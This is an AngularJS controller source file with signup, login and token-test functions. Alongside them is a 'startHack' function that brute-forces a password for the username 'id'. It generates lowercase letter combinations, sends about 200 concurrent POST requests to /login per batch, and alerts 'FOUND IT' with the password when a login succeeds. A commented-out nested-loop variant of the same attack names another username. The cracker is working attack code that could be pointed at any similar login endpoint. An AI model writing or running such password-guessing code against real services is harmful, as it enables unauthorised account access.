app.controller('signupController', ['$scope', '$http', '$timeout', '$q', function($scope, $http, $timeout, $q) {


    $scope.signupUser = function() {
        var name = $scope.usernameWish;

        if (!$scope.passwordWish || !$scope.passwordWish2 && $scope.passwordWish !== $scope.passwordWish2) {
            alert("Your passwords don't match");
            return;
        }

        var newUserRequestObject = {
            username: $scope.usernameWish,
            password: $scope.passwordWish
        };

        $http.post('/user', newUserRequestObject)
            .then(function(response) {
                console.log(response);
            }, function(err) {
            });
    };

    $scope.authUser = function() {
        var newUserRequestObject = {
            username: $scope.usernameAuth,
            password: $scope.passwordAuth
        };

        $http.post('/login', newUserRequestObject)
            .then(function(response) {
            	$scope.token = response.data.token;
                console.log(response);
            }, function(err) {
                console.log(err);
            });

    };
    
    
    $scope.test = function() {
    	
    	var tt = "abc";
    	
    	$http({
    		method: 'POST',
    		url: '/api/gettest',
    		data: {token: $scope.token}
    	})
    	.then(function(response) {
    		debugger;
    	}, function(err) {
    		
    	});
    	
    };
    

    var sendReq = function(newUserRequestObject) {
        $http.post('/login', newUserRequestObject)
            .then(function(response) {
                if (response.data === true) {
                    alert(newUserRequestObject.password);
                }


            }, function(err) {
            });
    };

    $scope.recentlyUsedTry = "abc";

    $scope.getTriedValue = function() {
        alert($scope.recentlyUsedTry);
    };


    $scope.startHack = function() {

        //idag

        var letters = [
            'a',
            'b',
            'c',
            'd',
            'e',
            'f',
            'g',
            'h',
            'i',
            'j',
            'k',
            'l',
            'm',
            'n',
            'o',
            'p',
            'q',
            'r',
            's',
            't',
            'u',
            'v',
            'w',
            'x',
            'y',
            'z',
        ];



        var promises = [];
        var promiseCounter = 0;
        var promisesMaxLength = 200;
        var zero = 0;
        var one = 1;

        var lastLetterIndexUsed = 0;

        var userName = 'id';

        var firstLetter = letters[0];
        var lettersLastIndex = letters.length - 1;
        var lettersLength = letters.length;

        var oneTry = firstLetter;

        oneTry = "aaaafnxr";

        var foundIt = false;
        var thePass;
        var oneTryLastIndex = oneTry.length - 1;




        String.prototype.replaceAt =function(index, replacement) {
            return this.substr(zero, index) + replacement+ this.substr(index + replacement.length);
        };


        function replaceCipher(indexInOneTry) {

            var letter = oneTry[indexInOneTry];

            var indexInLetters = letters.indexOf(letter);
            var nextIndex = indexInLetters + one;

            if (nextIndex < lettersLength) {
                oneTry = oneTry.replaceAt(indexInOneTry, letters[nextIndex]);
            }
            else {
                oneTry = oneTry.replaceAt(indexInOneTry, firstLetter);
                if (indexInOneTry > zero) {
                    replaceCipher(indexInOneTry - one);
                }
                else {
                    oneTry += firstLetter;
                    oneTryLastIndex++;
                }
            }

        }

        function readResponse() {
            $q.all(promises).then(function (responses) {
                angular.forEach(responses, function (response) {
                    if (response.data === true) {
                        alert('FOUND IT:' + response.config.data.password);
                        foundIt = true;
                        thePass = response.config.data.password;
                    }
                });
                if (foundIt) {
                    alert('FOUND IT: ' + thePass);
                }
                else {
                    promises = [];

                    $timeout(function() {
                        constructNew();
                    });
                }
            });
        }

        function fireCall() {
            var usrRequestObject = {
                username: userName,
                password: oneTry
            };

            var prom = $http.post('/login', usrRequestObject);
            promises.push(prom);

            promiseCounter++;

            if (promiseCounter > promisesMaxLength) {
                promiseCounter = zero;

                $scope.recentlyUsedTry = usrRequestObject.password;

                readResponse();
            }
            else {
                constructNew();
            }
        }

        function constructNew() {
            replaceCipher(oneTryLastIndex);

            lastLetterIndexUsed++;

            if (lastLetterIndexUsed > lettersLastIndex) {
                lastLetterIndexUsed = zero;
            }

            fireCall();
        }
        fireCall();






        // while (!foundIt) {
        //     debugger;
        //     currentAmountOfCiphers++;
        //
        //     for (var a = 0; a < letters.length; a++) {
        //         cipherArray[0] = letters[a];
        //
        //         for (var b = 0; b < letters.length; b++) {
        //             cipherArray[1] = letters[b];
        //
        //             for (var c = 0; c < letters.length; c++) {
        //                 cipherArray[2] = letters[c];
        //
        //                 for (var d = 0; d < letters.length; d++) {
        //                     cipherArray[3] = letters[d];
        //
        //                     for (var e = 0; e < letters.length; e++) {
        //                         cipherArray[4] = letters[e];
        //
        //                         for (var f = 0; f < letters.length; f++) {
        //                             cipherArray[5] = letters[f];
        //
        //                             for (var g = 0; g < letters.length; g++) {
        //                                 cipherArray[6] = letters[g];
        //
        //                                 for (var h = 0; h < letters.length; h++) {
        //                                     cipherArray[7] = letters[h];
        //
        //                                     // newUserRequestObject.password = cipherArray[0] + cipherArray[1] + cipherArray[2] + cipherArray[3] + cipherArray[4] + cipherArray[5] + cipherArray[6] + cipherArray[7];
        //
        //                                     oneTry = cipherArray[0] + cipherArray[1] + cipherArray[2] + cipherArray[3] + cipherArray[4] + cipherArray[5] + cipherArray[6] + cipherArray[7];
        //
        //                                     // var obj = {
        //                                     //     username: 'lyller',
        //                                     //     password: oneTry
        //                                     // };
        //                                     //
        //                                     // promises.push($http.post('/login', obj));
        //
        //
        //
        //                                     // sendReq(newUserRequestObject);
        //                                 }
        //
        //                             }
        //                         }
        //                     }
        //                 }
        //             }
        //         }
        //     }
        // }
    };


    // oneTry = cipherArray[0] + cipherArray[1] + cipherArray[2] + cipherArray[3] + cipherArray[4] + cipherArray[5] + cipherArray[6] + cipherArray[7];




}]);